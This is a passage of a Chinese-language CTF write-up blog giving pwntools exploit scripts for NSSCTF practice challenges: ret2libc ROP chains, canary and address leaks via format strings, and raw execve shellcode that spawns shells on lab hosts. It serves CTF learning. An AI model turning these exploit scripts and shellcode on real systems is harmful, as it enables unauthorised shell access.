#\\\\使用一个ret来跳转到pop_rdi然后就利用system(/bin/sh)即可</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>还有个大佬用的裸 so 打进去的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#p = process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">p = remote(&#x27;node5.anna.nssctf.cn&#x27;,28820)</span><br><span class=\"line\">elf = ELF(&#x27;./pw&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def debug():</span><br><span class=\"line\">    gdb.attach(p)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\">def get_addr():</span><br><span class=\"line\">\treturn u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">rdi = 0x400763</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x18 + p64(rdi) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.sym[&#x27;puts&#x27;]) + p64(elf.sym[&#x27;vuln&#x27;])</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = get_addr() - 0x06f6a0</span><br><span class=\"line\">system = libc_base + 0x0453a0</span><br><span class=\"line\">binsh = libc_base + 0x18ce57</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x18 + p64(rdi) + p64(binsh) + p64(system) </span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2019东北pwn2\"><a class=\"anchor\" href=\"#ciscn-2019东北pwn2\">#</a> [CISCN 2019 东北] PWN2</h5>\n<p>这又是个 ret2libc 的体型直接打</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&quot;./pwn2&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28652)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">start=0x400790</span><br><span class=\"line\"></span><br><span class=\"line\">ret=0x4006b9</span><br><span class=\"line\"></span><br><span class=\"line\">rdi_ret=0x400c83</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x58+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;choice!&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;encrypted&#x27;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(&#x27;puts addr is %x&#x27;%puts_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_addr=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr=libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">str_bin_sh=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2=b&#x27;a&#x27;*0x58+p64(ret)+p64(rdi_ret)+p64(str_bin_sh)+p64(system_addr)+p64(start)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;choice!&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;encrypted&#x27;,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"wustctf-2020getshell\"><a class=\"anchor\" href=\"#wustctf-2020getshell\">#</a> [WUSTCTF 2020]getshell</h5>\n<p>这个拿到 flag 后交不了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28667)</span><br><span class=\"line\">system_addr=0x804851B</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x18+0x4)+p32(system_addr)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gdouctf-2023easy-pwn\"><a class=\"anchor\" href=\"#gdouctf-2023easy-pwn\">#</a> [GDOUCTF 2023]EASY PWN</h5>\n<p>本地运行发现多输入几位发现提示没有 flag.txt 可以猜到直接 nc 连接多输入几位即可得到 flag，虽然得到了 flag 但是还是要分析一下这个程序，使用 checksec 后可以查看这个开启了地址随机化那打开 ida 发现这个 main 调用 check 然后在调用 printflag，然后我们还是写个脚本</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>pwn</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28563)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*50</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ret2shellcode\"><a class=\"anchor\" href=\"#hnctf-2022-week1ret2shellcode\">#</a> [HNCTF 2022 Week1]ret2shellcode</h5>\n<p>这个题要注意 c 语言的几个函数 memset、strcpy、mprotect 其中 mprotect 是赋权限 strcpy 是复制然后 memset 是设置前面的字符替换为指定字符<br />\n按照题目标题的话我们直接写入 shellcode 造成溢出然后在调用 buff 函数即可，因为 shellcode 写入的话 strcpy 将我们写入的 shellcode 写入到了 buff 字段<br />\n buff 字段可以直接去.bss 查看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28457)</span><br><span class=\"line\">shellcode=asm(shellcraft.sh())</span><br><span class=\"line\">payload=shellcode.ljust(0x108,b&#x27;a&#x27;)+p64(0x4040A0)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"2021-鹤城杯littleof\"><a class=\"anchor\" href=\"#2021-鹤城杯littleof\">#</a> [2021 鹤城杯] littleof</h5>\n<p>注意 canary 保护绕过方法注意使用方法 nssctf 上的环境有问题我的 poc 打不进去只有用这个</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#p = process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28316)</span><br><span class=\"line\">elf = ELF(&#x27;./littleof&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def debug():</span><br><span class=\"line\">    gdb.attach(p)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\">def get_addr():</span><br><span class=\"line\">\treturn u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"># leak canary</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x49</span><br><span class=\"line\">p.sendafter(b&#x27;overflow?&#x27;, payload)</span><br><span class=\"line\">p.recvuntil(payload)</span><br><span class=\"line\">canary = u64(p.recv(7).rjust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\">log.info(&#x27;canary addr is %x&#x27;%canary)</span><br><span class=\"line\"># leak libc_base</span><br><span class=\"line\">rdi = 0x400863</span><br><span class=\"line\">ret = 0x40059e</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x48 + p64(canary) + p64(0) + p64(rdi) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.sym[&#x27;puts&#x27;]) + p64(0x4006e2)</span><br><span class=\"line\">p.sendafter(b&#x27;harder!&#x27;, payload)</span><br><span class=\"line\">libc_base = get_addr() - 0x080aa0</span><br><span class=\"line\"></span><br><span class=\"line\"># leak canary</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x49</span><br><span class=\"line\">p.sendafter(b&#x27;overflow?&#x27;, payload)</span><br><span class=\"line\">p.recvuntil(b&#x27;a&#x27;*0x49)</span><br><span class=\"line\">canary = u64(p.recv(7).rjust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\">log.info(&#x27;canary addr is %x&#x27;%canary)</span><br><span class=\"line\"># get shell</span><br><span class=\"line\">system = libc_base + 0x04f550</span><br><span class=\"line\">binsh = libc_base + 0x1b3e1a</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x48 + p64(canary) + p64(0) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class=\"line\">p.sendafter(b&#x27;harder!&#x27;, payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1easyoverflow\"><a class=\"anchor\" href=\"#hnctf-2022-week1easyoverflow\">#</a> [HNCTF 2022 Week1]easyoverflow</h5>\n<p>又是一个栈不稳定直接 cat flag 的题源代码是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    setbuf(stdin,0);</span><br><span class=\"line\">    setbuf(stdout,0);</span><br><span class=\"line\">    setbuf(stderr,0);</span><br><span class=\"line\">    puts(&quot;Input something&quot;);</span><br><span class=\"line\">    char name[30];</span><br><span class=\"line\">    int number=0;</span><br><span class=\"line\">    gets(name);</span><br><span class=\"line\">    if(number!=0)&#123;</span><br><span class=\"line\">        puts(&quot;You win.&quot;);</span><br><span class=\"line\">        system(&quot;cat flag&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>保护全关直接让 name 溢出后即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;1.1.1.1&#x27;,11)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*50</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nssctf-2022-spring-recruitr3m4ke\"><a class=\"anchor\" href=\"#nssctf-2022-spring-recruitr3m4ke\">#</a> [NSSCTF 2022 Spring Recruit]R3m4ke?</h5>\n<p>一个很简单达到 payload 的题</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28195)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x28+p64(0x40072C)</span><br><span class=\"line\">p.sendlineafter(&#x27;started&gt;&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1fmtstrre\"><a class=\"anchor\" href=\"#hnctf-2022-week1fmtstrre\">#</a> [HNCTF 2022 Week1]fmtstrre</h5>\n<p>字符串溢出直接查看 name 在 bss 里面的位置直接打就行注意栈平衡<br />\n %38$s 直接获得 flag</p>\n<h5 id=\"gdouctf-2023shellcode\"><a class=\"anchor\" href=\"#gdouctf-2023shellcode\">#</a> [GDOUCTF 2023]Shellcode</h5>\n<p>read 储存 name 在 bss 段上面，并且可以写入 25 的字节长度但是 shellcraft 默认生成的字节数是 44 位长度，那我们直接去网上找一个小于 25 字节的 shellcode</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28735)</span><br><span class=\"line\">shellcode=&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&#x27;</span><br><span class=\"line\">name=0x6010A0</span><br><span class=\"line\">p.sendlineafter(&#x27;lease.&#x27;,shellcode)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0xA+0x8)+p64(name)</span><br><span class=\"line\">p.sendlineafter(&#x27;start!&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>这个题应该还能够 ret2libc 但是我打出来有点问题</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28010)</span><br><span class=\"line\">rdi_pop=0x4007b3</span><br><span class=\"line\">ret=0x40028e</span><br><span class=\"line\">elf=ELF(&#x27;pw&#x27;)</span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\">main=0x400687</span><br><span class=\"line\">p.sendlineafter(&#x27;lease.&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\">payload1=b&#x27;a&#x27;*(0xA+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class=\"line\">p.sendlineafter(&#x27;start!&#x27;,payload1)</span><br><span class=\"line\">puts_ad=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">log.info(&#x27;puts_ad is %x&#x27;%puts_ad)</span><br><span class=\"line\">libc=LibcSearcher(&#x27;puts&#x27;,puts_ad)</span><br><span class=\"line\">libc_base=puts_ad-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\">sys_addr=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\">str_bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\">p.sendlineafter(&#x27;lease.&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\">log.info(sys_addr)</span><br><span class=\"line\">log.info(str_bin_sh)</span><br><span class=\"line\">payload2=b&#x27;a&#x27;+(0xA+0x8)+p64(ret)+p64(rdi_pop)+p64(str_bin_sh)+p64(sys_addr)+p64(main)</span><br><span class=\"line\">p.sendlineafter(&#x27;start!&#x27;,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ezr0p32\"><a class=\"anchor\" href=\"#hnctf-2022-week1ezr0p32\">#</a> [HNCTF 2022 Week1]ezr0p32</h5>\n<p>把 /bin/sh 写在.bss 上然后直接打</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28655)</span><br><span class=\"line\">p.sendlineafter(&#x27;name&#x27;,&#x27;/bin/sh&#x27;)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x1c+0x4)+p32(0x080483d0)+p32(0)+p32(0x0804A080)</span><br><span class=\"line\">p.sendlineafter(&#x27;time~&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"深育杯-2021find_flag\"><a class=\"anchor\" href=\"#深育杯-2021find_flag\">#</a> [深育杯 2021] find_flag</h5>\n<p>这个题涉及的知识点有点多毕竟保护全开，打开 ida 查看到 sub 函数里面的有个字符串溢出可以得到 canary 和基地址，用 gdb 因为开启了 ple 不能在 main 函数上下断点就只有下在 printf 上了然后调试你可以用 stack 查看到 rbp 上面的地址是 ****00 可以猜到这个就是 canary 了因为 canary 一般情况下都是以 00 结尾的，canary 保护主要是通过在栈下设置一个地址，返回是也必须带上那个地址不然就会触发保护，然后 ple 保护的话主要是通过每次修改.text、.data 的地址。tips：使用 pwngdb 可以利用 fmtarg 来得到栈偏移量</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">import time</span><br><span class=\"line\">elf=ELF(&#x27;find_flag&#x27;)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28437)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,&#x27;%17$p---%19$p&#x27;)</span><br><span class=\"line\">p.recvuntil(&#x27;you, &#x27;)</span><br><span class=\"line\">a=p.recv(18)</span><br><span class=\"line\">p.recvuntil(&#x27;---&#x27;)</span><br><span class=\"line\">b=p.recv(14)</span><br><span class=\"line\">a=int(a,16)</span><br><span class=\"line\">b=int(b,16)</span><br><span class=\"line\">log.info(a)</span><br><span class=\"line\">log.info(b)</span><br><span class=\"line\">base=b-0x146F</span><br><span class=\"line\">system=base+elf.sym[&#x27;system&#x27;]</span><br><span class=\"line\">log.info(&#x27;system addr is %x&#x27;%system)</span><br><span class=\"line\">cat=base+0x2004</span><br><span class=\"line\">rdi=base+0x14E3</span><br><span class=\"line\">ret=base+0x101A</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x38+p64(a)+p64(0)+p64(ret)+p64(rdi)+p64(cat)+p64(system)</span><br><span class=\"line\">p.sendlineafter(&#x27;else? &#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hdctf-2023pwnner\"><a class=\"anchor\" href=\"#hdctf-2023pwnner\">#</a> [HDCTF 2023]pwnner</h5>\n<p>这个题又让我学到了伪随机数这个 srand (0x38) 控制着 rand 的随机大小只需要使用 python 库的 ctypes 只要有 srand 就能得到 rand 的大小</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libc = ctypes.CDLL(&quot;libc.so.6&quot;)</span><br><span class=\"line\">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class=\"line\">libc.srand(0x39)</span><br><span class=\"line\">rand_result = libc.rand()</span><br></pre></td></tr></table></figure></p>\n<p>最后代码如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import ctypes</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28917)</span><br><span class=\"line\">libc.srand.argtypes=[ctypes.c_uint]</span><br><span class=\"line\">libc.srand(0x39)</span><br><span class=\"line\">rand_result=libc.rand()</span><br><span class=\"line\">p.sendlineafter(&#x27;name:&#x27;,str(rand_result))</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x40+0x8)+p64(0x4008B2)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"litctf-2023口算题卡\"><a class=\"anchor\" href=\"#litctf-2023口算题卡\">#</a> [LitCTF 2023] 口算题卡</h5>\n<p>口算题要么口算要么写个脚本我这么懒肯定是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28904)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">while 1:</span><br><span class=\"line\">    eval_1=0</span><br><span class=\"line\">    payload=0</span><br><span class=\"line\">    p.recvuntil(&#x27;What is &#x27;)</span><br><span class=\"line\">    eval_1=p.recvuntil(b&#x27;?&#x27;)[:-1]</span><br><span class=\"line\">    log.info(eval_1)</span><br><span class=\"line\">    payload=eval(eval_1)</span><br><span class=\"line\">    p.send(str(payload))</span><br><span class=\"line\">p.recvline()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2022-新生赛有手就行的栈溢出\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛有手就行的栈溢出\">#</a> [SWPUCTF 2022 新生赛] 有手就行的栈溢出</h5>\n<p>看到危险函数栈溢出后跳转到 execve 